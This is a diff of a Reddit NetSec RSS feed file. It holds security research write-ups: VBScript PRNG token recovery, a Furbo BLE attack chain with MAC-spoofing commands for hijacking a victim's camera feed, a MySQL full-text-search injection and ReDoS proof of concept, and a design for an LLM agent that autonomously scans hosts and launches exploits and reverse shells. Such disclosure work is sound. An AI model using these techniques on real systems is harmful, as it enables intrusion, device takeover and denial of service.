@@ -1,921 +1,190 @@
-<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Yet Another Random Story. VBScript&apos;s Randomize Internals.</title><link>https://blog.doyensec.com/2025/09/25/yet-another-random-story.html</link><author>/u/nibblesec</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:50:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In one of our recent posts, Dennis shared an interesting case study of C# exploitation that rode on -based password-reset tokens. He demonstrated how to use the single-packet attack, or a bit of old-school math, to beat the game. Recently, I performed a security test on a target which had a dependency written in VBScript. This blog post focuses on VBS’s  and shows that the situation there is even worse.The application was responsible for generating a secret token. The token was supposed to be unpredictable and expected to remain secret. Here’s a rough copy of the token generation code:The first thing I noticed was that the  function was called inside a loop. That should reseed the PRNG on every single iteration, right? That could result in repeated values. Well, contrary to many other programming languages, in VBScript, the  usage within a loop is not a problem per se. The function will not reset the initial state if the same seed is passed again (even if implicitly). This prevents generating identical sequences of characters within a single  call. If you actually want that behavior, call  with a negative argument immediately before calling  with a numeric argument.But if that isn’t an issue, then what is?How VBS’s  Works in PracticeHere’s a short API breakdown:If no seed is explicitly specified,  uses  to set it (not entirely true, but we will get there).  returns seconds since midnight as a  value. ￼ advances a global PRNG state and is fully deterministic for a given seed. Same seed, same sequence, like in other programming languages.There are some problematic parts here, though. Windows’ default system clock tick is about 15.625 ms, i.e., 64 ticks per second. In other words, we get a new implicit seed value only once every 15.625 milliseconds.Because the returned value is of type , we also get precision loss compared to a  type. In fact, multiple “seeds” round to the same internal value. Think of collisions happening internally. As a result, there are way fewer unique sequences possible than you might think!In practice there are at most 65,536 distinct effective seedings (details below). Because  resets at midnight, the same set recurs each day.We ran a local copy of the client’s code to generate unique tokens. During almost 10,000 runs, we managed to generate only 400 unique values. The remaining tokens were duplicates. As time passed, the duplicate ratio increased.Of course the real goal here would be to recover the original secret. We can achieve that if we know the time of day when the  function started. The more precise the value, the less computations required. However, even if we have only a rough idea, like “minutes after midnight”, we can start at 00:00 and slowly increase our seed value by 15.625 milliseconds.We started by double-checking our strategy. We modified the initial code to use a command-line provided seed value. Note, the same seed is used multiple times. While in the original code, it is possible that seed value changes between the loop iterations, in practice that doesn’t happen often. We could expand our PoC to handle such scenarios as well, but we wanted to keep the code as clean as possible for the readability.We took a precise  value from another piece of code and used it as an input seed. Strangely though, it wasn’t working. For some reason we were ending up with a completely different PRNG state. It took a while before we understood that  and  aren’t exactly the same things.VBScript was introduced by Microsoft in the mid-1990s as a lightweight, interpreted subset of Visual Basic. As of Windows 11 version 24H2, VBScript is a Feature on Demand (FOD). That means it is installed by default for now, but Microsoft plans to disable it in future versions and ultimately remove it. Still, the method of interest is implemented within the  library and we can take a look at :When we previously said that a bare  uses  as a seed, we weren’t exactly right. In reality, it’s just a call to WinApi’s . It computes seconds plus fractional milliseconds as s, then narrows to  () using the  assembly instruction.Let’s use  as an example. It can be represented as  in hex notation. After all this math is performed, our  becomes  and is used as the seed input.This is what happens otherwise, when the input is explicitly given:When we do specify the seed value, it’s processed in an entirely different way. Instead of being converted using the  opcode, it’s shifted right by 32 bits. So this time, our   becomes  instead. We end up with completely different seed input. This explains why we couldn’t properly reseed the PRNG.Finally, the middle two bytes of the internal PRNG state are updated with a byte-swapped XOR mix of those bits, while the top and bottom bytes of the state are preserved.Honestly, I was thinking about reimplementing all of that to Python to get a clearer view on what was going on. But then, Python reminded me that it can handle almost infinite numbers (at least integers). On the other hand, VBScript implementation is actually full of potential number overflows that Python just doesn’t generate. Therefore, I kept the token-generation code as it was and implemented only the seed-conversion in Python.Now, we can run the base code and capture a semi-precise current time value. Our Python works with properly formatted strings, so we can convert the number using a simple method:Let’s say the token was generated precisely at  and we got the QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 string. In the case of our target, we knew that some files were created at 17:55:54, which was rather close to the token-generation time. In other cases, the information leak could come from some resource creation metadata, entries in the log file, etc.We iterate time seeds in 0.015625-second steps (64 Hz) across the suspected window and we filter all duplicates.We started our  script with a 1s range and we successfully recovered the secret in the 4th iteration:PS C:\share> python3 .\brute_timer.py 17:55:54 17:55:55
-[INFO] Range 64554.00000 to 64555.00000 in 0.015625-s steps
-[64554.00000] Test #1: eYIkXKdsUTC3Uz#R)P$BlVRJie9U2(4B // calculated seed: 2.3397787718772567e+36
-[64554.01562] Test #2: ZTDgSGZnPP#yQv*M6L)#hQNEdZ5Px50$ // calculated seed: 2.3397838424796576e+36
-[64554.03125] Test #3: VP!bOBUjLK&uLq8I2G7*cMIAZV0Lt1v* // calculated seed: 2.3397889130820585e+36
-[64554.04688] Test #4: QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7 // calculated seed: 2.3397939836844594e+36
-[...snip...]
-VBScript’s  and  are fine if you just want to roll some dice on screen, but don’t even think about using them for secrets.]]></content:encoded></item><item><title>Hacking Furbo - A Hardware Research Project – Part 5: Exploiting BLE</title><link>https://www.softwaresecured.com/post/hacking-furbo-a-hardware-research-project-part-5-exploiting-ble</link><author>/u/duduywn</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 10:31:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Part 5 of the Hacking Furbo blog series is here and in this article we'll be focusing on an area which has gotten little attention thus far: Bluetooth Low Energy (BLE).As with Part 2, we continued to find places where Furbo’s security was already quite good. Stubborn as we are, though, we were still able to find areas that were vulnerable. We will detail how we discovered the paths to exploiting various vulnerabilities in Furbo’s implementation of BLE through the analysis of a live device, its logs, and the decompiled mobile application.When a new device is first set up, the end-user has to connect that device to their local Wi-Fi network. Furbo handles this by connecting to the user's mobile phone, where a communication flow occurs over Bluetooth to pass the authentication details to the device. Once this is completed, the device ceases to communicate with the application over Bluetooth. Honestly, it was an area we overlooked at first because it was such a quick and seamless process.As we dug further into the application and device however, we realized it was an area we should explore further. This interest was prompted by discussions with a colleague who had done ample research on BLE in the past—Kevin2600.The first question we wanted to answer was simple: "Are the communications between device and mobile application encrypted?"To do so, we leaned on adb bugreport. On an Android device with developer options enabled, a report can be generated which details all of the logging information related to the operations of the device. By default, this bugreport does not include Bluetooth communications however by enabling Bluetooth HCI Snoop Log in the Developer settings we could gain insight into these too.So, we turned this on, ran the pairing process, and entered in the credentials of a hotspot we had set up for testing. To help us identify the password more easily we used a string we could more easily search for: “FINDMEPASSWORD”. We then pulled the report with adb bugreport <filename> onto our host machine and unzipped the archive.After digging up the btsnoop_hci.log file, we pulled it into WireShark where we could more easily analyze the communications. There were a ton of logs to parse, so we applied the btatt filter to reduce it some and found the first destination which was a MAC address and started from that point. This packet was our first indicator that we were focusing on the right device.Reviewing more of the packets, we realized that much of the communications were split up across several sends, meaning it would be challenging to decipher what exactly was being sent or received. It also seemed as though that some of the data may be hex encoded based on the packets seen in Wireshark. Rather than trying to piece it all together, we grepped out any possible hex values and whipped up a Python script which would parse the log file and hopefully extract whatever data we were looking for.And with that, we had our first BLE vulnerability. The passwords and SSIDs which were sent to a Furbo device were being communicated over BLE in an unencrypted format!After the excitement of this first finding we decided it would be well worth investigating this interface further. Using an nrf52840 adapter, we set up the Nordic Semiconductor nRF Connect app to view the exposed GATT Characteristics and Services through a graphical interface.While we could write to one characteristic, the rest were simply reads which returned information about our device. Fuzzing the writable characteristic with various characters we found that sending 1 or 2 would result in either a "soft" or "hard" reset of the device—essentially allowing us to turn the device off or disconnect it from the Wi-Fi temporarily.The "soft reset", from what we could tell, was used to change the Wi-Fi Network the device was connected to. This state was only temporary and once the device was manually rebooted, it would connect back to the original network using the saved credentials it had.We will return to the “hard reset” shortly.While it may seem like an annoyance at first glance, these devices are touted as security products in some of the marketing materials; meaning that this vulnerability has a slightly higher impact. If, for example, I were a bad guy breaking into someone's house, I could switch off the Furbo's video feed before entering with this vulnerability.As we were toying around with the pairing process, we monitored the device logs under /tmp/log, trying to determine what was occurringat each step; it was then that we discovered there must be more GATT Characteristics than what we saw at first glance with the nRF Connect application.In the second picture we can see the SSID and Wi-Fi password being sent in hex.We figured that if they were being used in the communication flow, they must be referenced somewhere in the APK. Using grep, we searched for the locations of the UUIDs.Within this file we found many more characteristics referenced, as well as operations they may be used for.Exposing BLE GATT CharacteristicsAfter some trial and error, we discovered that in order to expose the additional GATT characteristics and services  we would have to put the device into a factory reset mode. In this state all the GATT characteristics that were listed in the APK were visible and could be interacted with. The challenge for us with this requirement was that you would need physical access to insert a small paperclip and hold down a button for 10 seconds, at which point the attack seemed pointless.This brings us back to the previously mentioned reset modes we discovered through fuzzing: the second of which was the “Hard Reset”, this is where things got interesting. When we first ran the full reset command we didn't notice much of a difference compared to the "Soft Reset". The device went offline, but when we tried to scan for any other characteristics there were none to be found.After doing a little more research into BLE and how connections work we came to the conclusion that after issuing the "Full Reset" command, we would have to disconnect and reconnect our session. Once reconnected to the device after sending the "Full Reset" command we discovered that  of the device's GATT characteristics were active and available. These newly exposed characteristics opened the door for several attacks which we will explore throughout the rest of the article.Our theory was that we may have two different attack scenarios that could be exploited based on the information exposed by these GATT characteristics.The first attack was a Denial Of Service which revolved around the device registration process, specifically how devices could be re-registered after they were already bound to an account.The second attack could be used to interrupt and replace the camera feed of a device by exploiting how the device authenticated with the TUTK P2P network in order to stream video to the mobile application.Both of these attack chains required the following information from the victim device in order work: The second attack, in addition to the other three variables, also required the victim's P2P UUID which connected their device to the TUTK network.Reading Sensitive Data from Exposed GATT CharacteristicsThe characteristic C1C1D58F-6CDC-426D-AA4D-5A18BD88FE37 could be used to read the device token and 2E2F1C66-ACE9-46AA-A993-641FCE7A5C9C allowed us to read the P2P UUID the device was using in order to stream video over the TUTK network.Using these 2 exposed GATT characteristics, we were able to retrieve two out of the four victim details required to complete the attack chain. Now all that was left was to retrieve the AccountID and DeviceID.The AccountID and DeviceID would prove slightly more challenging to retrieve. We knew that the Firehose logging service, which we had decrypted in Part 1 of our blog series, contained these IDs, however up until this point we had only seen it run after a device was first connected to an account. We didn't like the restrictions this put on our attack chain, so we needed to uncover a way to control the Firehose.After much testing and log review, we discovered that there were other conditions that could trigger the service to run. If the device was disconnected from the Internet for more than three minutes the Firehose service would collect the data and attempt to send it off once re-connected.This was something we could control using some of the other newly exposed GATT characteristics.The following GATT characteristics were exposed after the device was put into "Full Reset" mode which we could use in order to control the device's internet connection:The scenario was fairly simple: if we were within range of the device we could disconnect it from its network, force it to connect to our own access point (while it was not connected to the internet), and then, after allowing for the three minute delay, reconnect it and proxy the traffic through certmitm. The end result was that the Firehose service would run and we'd decrypt the TLS traffic containing the AccountID and DeviceID.Gathering the Furbo Infinity StonesThe complete attack chain, using the Furbonator script:Get within range of the victim's Furbo device.Connect to the device over Bluetooth and put it into "Full Reset" mode.Retrieve the Device Token.Reset the WiFi Connection.Send the attacker-controlled SSID.Send the password for the attacker-controlled access point.Allow for a three minute delay.Send the Wi-Fi Ready command so the Victim Furbo Connects to your proxied network.Capture Firehouse logs using certmitm and grab the AccountID.Denial of Service — Re-Registering Victim DeviceWith these details we were now ready to attempt our first attack: re-registering the victim's device to our account.By combining the previous DeviceID Spoofing attack with the leaked AccountID, DeviceID, and Device Token an attacker can now re-register a victim's device, completely disabling it and preventing it from ever being registered again.Factory reset the attacker device.Connect to the device over UART and replace the MAC address with the victim's DeviceID. sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonModify /mnt/flash/furbo/setup_info.json, adding the victim's AccountID, DeviceID and DeviceToken.Add the device to the attacker's account following the instructions in the mobile application.During the registration process, when prompted with the message,"This Furbo was already registered. If you register a new account the previous account will be disconnected" click "Register New Account".Once the setup is completed the attacker should now have the victim's device added to their account.As their DeviceID is now associated with the attacker's account, and they cannot get the DeviceToken, the victim will be unable to re-register their device to their own account. As a result, they will have lost all functionality of their Furbo device, essentially bricking it.Look at me! I am the camera nowBuilding off of the DoS re-registration attack we could take this one step further. We could use the P2P UUID grabbed from BLE to interrupt the victim's video stream and replace it with the attacker's own stream. This is possible by abusing the P2P authentication flow in order to re-issue credentials for the spoofed UUID, authorizing the attacker device to stream on the TUTK network and replacing the victim's video stream with their own.In order to stream on the TUTK network each device requires P2P UUID. When a device is registered to your account you are also authorizing the mobile account to request the video stream from that particular P2P UUID.When the device is paired and registered, the mobile application retrieves a P2PAccountID, P2PAuthKey, and P2PPassword from an API—which are the values we retrieved from the device's memory in Part 2. These details are then passed to the device, from which it is sent back to the Furbo servers to retrieve a P2P UUID.This P2P UUID is bound to the DeviceID; even when a device is reset the DeviceID stays the same, meaning that when it reconnects it will maintain the same P2P UUID.However, having the P2P UUID is not enough to stream on the TUTK network. You also require an Authkey and Password. However, these credentials can automatically be generated and reissued to a device as long as it has a valid AccountID, DeviceID, DeviceToken, and P2P UUID which in our case we do.Credential Regeneration FlowThe device boots and checks for P2P credentials, if it fails to find the p2p_auth.json file the following flow occurs.The device makes POST requests to: /v5/device/setup, supplying the AccountID, DeviceToken, DeviceID, and P2P UUID.Furbo validates the request Confirms P2P UUID ↔ DeviceID ↔ AccountID relationshipIssues new TUTK credentials: authKey, password.Device writes a new p2p_auth.json file Old credentials are invalidated (only the latest credentials for a P2P UUID are valid on the TUTK network).Taking over the video streamRegister the device so it is active in the mobile application.Connect to device over UART and replace the MAC address with the victim's DeviceID sed -i 's/"system\/info\/mac": *"[^"]*"/"system\/info\/mac": "[VICTIM_MAC]"/' /mnt/hw/factory.jsonEdit the /mnt/flash/furbo/setup_info.json file and add the victim's AccountID, DeviceID, DeviceToken, and P2P UUID.Remove the /mnt/flash/furbo/p2p_auth.json file.Once the attacker's device reboots it will check to see if that p2p_auth.json file is located on the device, it will then reach out to Furbo's servers in order to retrieve the details. As all the details on the attacker's device are the same as the victim's device, Furbo will generate new credentials for the victims P2P UUID, invalidating their own. As a result, the attacker's device is the only valid “online” device for that P2P UUID. When the victim opens their mobile application, they will see the attacker's video stream and not their own as that is what will be returned when the application searches for that P2P UUID on the TUTK network.That concludes Part 5 of the Hacking Furbo blog series. BLE is an often overlooked communication protocol, one we nearly overlooked ourselves. However, as we have shown, it can yield very interesting results when it is interrogated effectively. We were able to build attack chains based on data garnered through BLE to take over the device’s video streams and gain unauthorized access to someone’s Wi-Fi network, serious stuff. The next part will be the grand finale! We will finish off with a review of the filesystem where we found numerous vulnerabilities including one which allowed us to view the activity of  Furbo worldwide.]]></content:encoded></item><item><title>Why “contained” doesn’t mean “safe” in modern SOCs</title><link>https://blog.strandintelligence.com/compliance-wont-stop-a-breach-heres-why/</link><author>/u/SuccessfulMountain64</author><category>netsec</category><pubDate>Thu, 25 Sep 2025 09:12:34 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ReDisclosure: New technique for exploiting Full-Text Search in MySQL (myBB case study)</title><link>https://exploit.az/posts/wor/</link><author>/u/Difficult-Catch9885</author><category>netsec</category><pubDate>Wed, 24 Sep 2025 21:12:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA["Even a small key can open a big lock" Azerbaijani Proverb
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://news.securenza.be</link><description></description><item><title>Offline Decryption Messenger: Concept Proposal and Request for Constructive Feedback</title><link>https://nextcloud.calzone-rivoluzione.de/s/pLoNrkgrerbSzfx</link><author>/u/calzone_rivoluzione</author><category>netsec</category><pubDate>Sat, 13 Dec 2025 16:01:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Building an Open-Source AI-Powered Auto-Exploiter with a 1.7B Parameter Model</title><link>https://mohitdabas.in/blog/genai-auto-exploiter-tiny-opensource-llm/</link><author>/u/beyonderdabas</author><category>netsec</category><pubDate>Sat, 13 Dec 2025 07:54:59 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[What if I told you that a 1.7 billion parameter model running entirely on your local machine could autonomously scan networks, identify vulnerabilities, search for exploits, and execute them—all without a single penny spent on API calls? Welcome to the future of security automation where open-source AI meets penetration testing.In this deep dive, I’ll show you how I built an AI-powered auto-exploiter that combines LangChain, LangGraph, and the tiny but mighty  model to create an autonomous penetration testing agent. This isn’t just another GPT wrapper—this is a  that thinks, plans, and executes complex security workflows.: This tool is for educational and authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any system.The cybersecurity landscape is shifting. We’re moving from manual exploitation to AI-assisted security testing, but most solutions rely on expensive cloud APIs (looking at you, GPT-4). Here’s what makes this approach revolutionary:: No data leaves your machine. Perfect for sensitive pentests.: No API fees. Run it 24/7 without worrying about your credit card.: The entire model is only ~1GB. Runs on a potato.Autonomous Decision Making: The agent reasons about service versions, exploit suitability, and execution strategies.: Open-source tools you can modify and extend.┌─────────────────────────────────────────────────────────────┐
+│                      User Input                              │
+│                  (Target IP/Hostname)                        │
+└────────────────────┬────────────────────────────────────────┘
+                     │
+                     ▼
+┌─────────────────────────────────────────────────────────────┐
+│              LangGraph ReAct Agent                           │
+│         (Powered by Qwen3:1.7b via Ollama)                  │
+│                                                              │
+│  ┌─────────────────────────────────────────────────┐       │
+│  │  Think → Act → Observe → Think → Act...        │       │
+│  └─────────────────────────────────────────────────┘       │
+└───┬─────────────┬──────────────┬──────────────┬────────────┘
+    │             │              │              │
+    ▼             ▼              ▼              ▼
+┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐
+│  Nmap   │  │Searchspl │  │  Mirror  │  │   Execute    │
+│  Scan   │  │   oit    │  │ Exploit  │  │   Exploit    │
+└─────────┘  └──────────┘  └──────────┘  └──────────────┘
+    │             │              │              │
+    └─────────────┴──────────────┴──────────────┘
+                     │
+                     ▼
+            ┌────────────────┐
+            │ Target System  │
+            └────────────────┘
+Understanding ReAct AgentsReAct (Reasoning + Acting) is a paradigm where LLMs generate reasoning traces and task-specific actions in an interleaved manner. Here’s how it works:: The agent reasons about what to do next: The agent calls a tool: The agent receives the tool output: Process continues until task is completeThought: I need to scan the target to identify services
+Action: scan_target("192.168.1.100")
+Observation: Port 22 open - SSH 2.0 OpenSSH_7.4
 
----[ Index
-1 - Introduction
-2 - Tradition
-    2.1 - ReDoS, not the OS
-    2.2 - REGEXP, RLIKE and others
-3 - How insecure, secure implementations are?
-4 - Study Case: myBB
-    4.1 - Identification
-    4.2 - Perfect Match Against Sanitization
-    4.3 - Exploiting
-5 - Acknowledgements
-6 - References
+Thought: I found OpenSSH 7.4, let me search for exploits
+Action: search_exploits("OpenSSH 7.4")
+Observation: Found CVE-2023-XXXX - Remote Code Execution
 
---[ 1 - Introduction
-For years, SQL Injection has been mostly about syntax-breaking payloads. But
-with tools getting advanced, it is more about creating "cooler payload" /
-finding ignored SAST warnings. I am a newbie who noticed this pattern going
-back and forth and started searching for possibility of injection, without
-escaping anything, something that SAST/WAFs don't have a rule for.
+Thought: This exploit looks promising, let me download it
+Action: mirror_exploit("EDB-12345")
+...
+This is fundamentally different from simple prompt-response systems. The agent  and .I’ve equipped the agent with 7 powerful tools, each serving a specific purpose:1.  - Network Reconnaissance: The  flag performs version detection, which is crucial for finding matching exploits. The  flag speeds up the scan (timing template 4 out of 5).2.  - Vulnerability Database Search: The tool filters for Python and C/C++ exploits because they’re easier to execute and modify. JSON output gives us structured data the LLM can parse.3.  - Exploit Download4.  - Code AnalysisThis is where the magic happens. The agent  the exploit code to understand:Whether it’s a bind shell or reverse shellAny manual setup required5.  - Reverse Shell Handler: The agent needs to understand the difference between:: Target connects back to attacker (needs listener): Target opens port (direct connection): This is the most dangerous tool. In production, you’d want sandboxing and additional safety checks.Here’s the full implementation of the orchestrator with detailed comments:How It Works: Step-by-StepLet me walk you through a complete execution cycle:Phase 1: Initial ReconnaissanceUser Input: "192.168.1.100"
 
-This paper presents a new technique for Regex Injection. At the beginning I
-will explain just a bit of traditional methods that we knew before, then
-shift into the technique and then we will study one of the vulnerabilities I
-found in myBB which allowed viewing deleted thread names as an
-unauthenticated user.
+Agent Thought: "I need to scan this target first to see what's running"
+Agent Action: scan_target("192.168.1.100")
+The agent receives nmap output:PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.4.6
+3306/tcp open mysql   MySQL 5.5.62
+Phase 2: Vulnerability AnalysisAgent Thought: "I found 3 services. Let me search exploits for each."
+Agent Action: search_exploits("OpenSSH 7.4")
 
---[ 2 - Tradition
-This section explains traditional methods that were usually used to identify
-vulnerabilities related to regex. But before going further, let's understand
-the difference between regex, wildcard, and operator. BTW, originally I
-wanted to call this paper WOR technique.
+Observation: [Exploit list received]
 
-----[ 2.1 - ReDoS, not the OS
-A regular expression (Regex) is a sequence of characters that specifies a
-match pattern in text. The main feature of regex is the ability to match
-complex string patterns. A wildcard, on the other hand, is a symbol used to
-represent zero or more characters. In SQL, the percent sign (%) and
-underscore (_); in regex, the period (.) and asterisk (*) are considered
-wildcards. Operators are logical symbols; some examples include AND, OR,
-NOT, =, !=, <, >, >=, <=, +, -, *, /. Operators like asterisk are used for
-calculations, so don't confuse them with wildcards. I guess now you
-understand why I wanted to call it WOR technique. Certainly not because WOR
-means thief in Russian and the whole article is about a technique for
-stealing information from software that I can't write about because its
-developers prioritize feature over security.
+Agent Action: search_exploits("Apache 2.4.6")
 
-Backtracking is a problem-solving method where you return to a previous
-decision point (backtrack) in a process and try a different option when the
-current path fails to produce a valid result. It is like being in a
-labyrinth with multiple paths. You try one path, but hit a dead end. So, you
-backtrack--go back to the last junction where you had other options--and try
-a different direction. You keep repeating this process until you either find
-the exit or exhaust all paths.
+Observation: [More exploits found]
 
-A quantifier specifies how many times the preceding element must occur for a
-match to happen.
+Agent Action: search_exploits("MySQL 5.5.62")
 
-Quantifier | Meaning                           | Regex | Match
-++++++++++++++++++++++++++++++++++++++++++++
-*                | Zero or more times          | p*       | "","p","ph"...
-+                | One or more                   | p+       | "p","ph","phr"
-?                | Zero or one                     | p?       | "", "p"
-{n}              | n times                           | p{3}     | "ppp"
-{n,}             | n or more times              | p{2,}    | "pp","ppp"...
-{n,m}          | Between n and m times | p{2,4}  | "pp", "ppp", "pppp"
+Observation: [MySQL exploits located]
+Phase 3: Exploit EvaluationThe agent analyzes each exploit:Agent Thought: "I found CVE-2021-XXXX for Apache 2.4.6. 
+               Let me check if the version matches."
 
-Nested quantifiers are patterns where a quantifier is applied to a subpattern
-that already has a quantifier. So I can't just take p+? pattern, add
-quantifier + and make it p+?+, because the syntax is invalid. This is where
-"Capturing group" comes to help. The p+ means "one or more p." When we add ?
-to it, it means "one or more p's (the + part), but not more than one (the ?
-part) p." It means that if the input is "ppp," the output will match exactly
-one p. So the output will be Match 1 (p), Match 2 (p), Match 3 (p). Now
-when I group this subpattern (p+?), the pattern match will stay the same,
-and the group match will be the same as the pattern match, because there is
-no extra quantifier. If I change it a bit by adding +, making it (p+?)+, it
-will mean "one or more p's, but not more than one p, repeated one or more
-times until it succeeds." So the subpattern will repeat until it succeeds;
-the inner regex takes the first p, second p, and third p. Now that no more
-characters are left, the pattern stops. Overall match is the concatenation
-of all results "ppp." A capturing group only "remembers" the last result of
-the subpattern, which is "p."
-
-Pattern  | Meaning of pattern   | Regex | Match Result  |
-++++++++++++++++++++++++++++++++++++++++++
-(...)        | groups a subpattern | (p+?)+ | "ppp" (pattern |
-match), "p" (group match)
-++++++++++++++++++++++++++++++++++++++++++
-ReDoS (Regular Expression Denial of Service) is a vulnerability where a regex
-lets an attacker supply input that makes the engine backtrack for an
-extremely long time, causing DoS. Usually, regex that has nested qualifiers
-leads to ReDoS.
-
-To create a ReDoS payload, our inner quantifier should grab as much as it
-can. Therefore, the subpattern could be something like a+ or a*. If our
-input is aaaac, it will match aaaa. Next, we can create a nested quantifier
-by using a* as the subpattern and then adding a + quantifier. This way, the
-a* group will match repeatedly until it succeeds. Our new regex is (a*)+.
-
-If the input is aaaac, the first match is aaaa. Then, because the asterisk
-(*) means "zero or more," we also get zero-length matches. For instance,
-after aaaa is matched, there is an empty match between aaaa and c, and
-another empty match after c, giving three matches in total (two of which are
-empty).
-
-We can force a mismatch after these matches by adjusting the pattern to
-expect the string to end with b, even though our input ends with c. Hence,
-the new regex is (a*)+b, and our input remains aaaac. The (a*)+ part can
-match aaaac in numerous ways because a* can match zero or more 'a's, and the
-+ quantifier allows multiple such matches. Each different way (a*)+ can
-consume part of the string is a "possible result" for that subpattern. Since
-the overall regex (a*)+b fails on its first attempt, the regex engine must
-backtrack and see if there was another way for (a*)+ to match aaaac that
-might allow the subsequent b to match. The bigger the input, the more
-backtracking possibilities are created, leading to a potential DoS.
-
-For example (just for demonstration), consider ways of partitioning aaaa into
-one or more non-empty groups of a. This is not exactly how most regex
-engines work, but it illustrates the concept of multiple ways to match.
-1: ("aaaa")
-2: ("aaa")("a")
-3: ("aa")("aa")
-4: ("a")("aaa")
-5: ("aa")("a")("a")
-6: ("a")("aa")("a")
-7: ("a")("a")("aa")
-8: ("a")("a")("a")("a")
-
-Pattern | Description                               | Input     |
------------|-----------------------------------------|------------|
-(a*)+b   | inner a+ (1 or more a), outer    | aaaac   |
-             | (...)+ repeats                            |              |
------------|-----------------------------------------|------------|
-Example script to demonstrate ReDoS:
-____________________________________________________________
-package main
-
-import (
-    "fmt"
-    "os"
-    "os/exec"
-    "os/signal"
-    "strings"
-    "syscall"
-    "time"
-    "github.com/dlclark/regexp2"
+Agent Action: verify_exploit_suitability(
+    "Apache 2.4.6 RCE", 
+    "Apache httpd 2.4.6"
 )
 
-func main() {
-    fmt.Println("ReDoS PoC")
-    count := 200
-    pid := os.Getpid()
-    re := regexp2.MustCompile(`(a*)+b`, 0)
-    input := strings.Repeat("a", count) + "c"
-    sigs := make(chan os.Signal, 1)
-    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
-    done := make(chan struct{})
-    go func() { <-sigs; close(done); os.Exit(0) }()
-    go func() { re.MatchString(input); close(done) }()
-    for {
-        select {
-        case <-done:
-            return
-        default:
-            out, _ := exec.Command("ps", "-p", fmt.Sprintf("%d", pid),
-                "-o", "%cpu=").Output()
-            cpu := strings.TrimSpace(string(out))
-            fmt.Printf("CPU usage: %s\n", cpu)
-            time.Sleep(500 * time.Millisecond)
-        }
-    }
-}
-____________________________________________________________
-Response:
-khatai@5df0825ade8a tmp % go run main.go
-ReDoS PoC
-CPU usage: 0.0
-CPU usage: 80.2
-CPU usage: 97.7
-CPU usage: 100.0
-CPU usage: 100.0
+Agent Thought: "Version match confirmed. Let me download this exploit."
+Agent Action: mirror_exploit("12345")
+Observation: "Exploit downloaded to 12345.py"
 
-----[ 2.2 - REGEXP, RLIKE and others
-Beyond application-level regex engines, many database systems also use
-regular expressions for matching strings. Let's, for instance, take REGEXP.
-REGEXP itself can lead to information disclosure, and prepared statements
-won't help, as this has nothing to do with the regex itself. It all comes
-down to insecure implementation. For example, in a case where an SQL query
-is like this: SELECT Name FROM Data WHERE Content REGEXP '^?', using
-prepared statements or backslashing (preg_quote) won't be much help. If user
-input is .*, it all will look like this:
-Input: '.*'
-Trimmed: '.*'
-preg_quote()'d and escaped: '\.\*'
-Final REGEXP Pattern: '^\.\*'
-SELECT Name FROM Data WHERE Content REGEXP '^\.\*';
+Agent Action: inspect_exploit_code("12345.py")
+Observation: [Full Python code returned]
 
-Problems like these can be easily fixed if there is a "visibility" column
-or some special prevention against regex cases. In most applications, there
-probably are implementations to prevent these cases from happening. So we
-will want an SQL function, which accepts a "sequence of characters that
-specifies a match pattern in text" (which basically defines regex) but isn't
-documented as a regex function in the MySQL documentation.
+Agent Thought: "After analyzing the code, I see this is a reverse shell 
+               that needs LHOST and LPORT arguments. It will connect 
+               back to me on port 4444."
+Phase 5: Preparation and ExecutionAgent Action: start_listener(4444)
+Observation: "Listener started on port 4444"
 
---[ 3 - How insecure, secure implementations are?
-Let's take `real_escape_string` for example; everything seems fine, as it
-escapes single and double quotes, which are usually enough. But if you take
-a look at "backup" and similar options of most systems, you will notice
-that they don't use single/double quotes, they use backticks for table
-names. Backticks are used mostly with REPAIR, EXPORT, OPTIMIZE, ANALYZE,
-TRUNCATE, ALTER and so on. It might seem dumb, but I consider this as
-insecure design rather than insecure implementation. The C API function
-`mysql_real_escape_string_quote`, escapes backticks, while nothing else I
-have seen does. The above part was just an example, a "noteworthy comment"
-if you will.
+Agent Thought: "Listener is ready. Now I'll execute the exploit with 
+               proper arguments."
 
-The real deal is Full-Text Search Functions. They are used in most
-softwares, especially blogs, LMS, and forums for advanced searching.
-According to Wikipedia, "Full-text search refers to techniques for searching
-a single computer-stored document or a collection in a full-text database".
-When performing Full-text search (from now on FTS) DBMS use certain
-characters with special meanings. These characters also specify match
-pattern, which defines regex, but not the usual regex we know of; this one
-is custom. MySQL can perform boolean full-text searches using special
-boolean mode operators; the syntax looks like this: MATCH (col1,col2,...)
-AGAINST (expr [search_modifier]). But before going into that, here is a
-basic table showing the difference between the Regex we know and Boolean
-Mode Operators.
-
-Character  | Traditional Regex | MySQL Boolean Mode        |
-________________________________________________
-| +        | one or more                   | word must be present       |
-| -         | No special meaning       | word must not be present |
-| *         | zero or more                  | Wildcard character           |
-| ^        | start of string or line       | No special meaning          |
-| $        | end of string or line        | No special meaning          |
-| .         | Wildcard character         | No special meaning          |
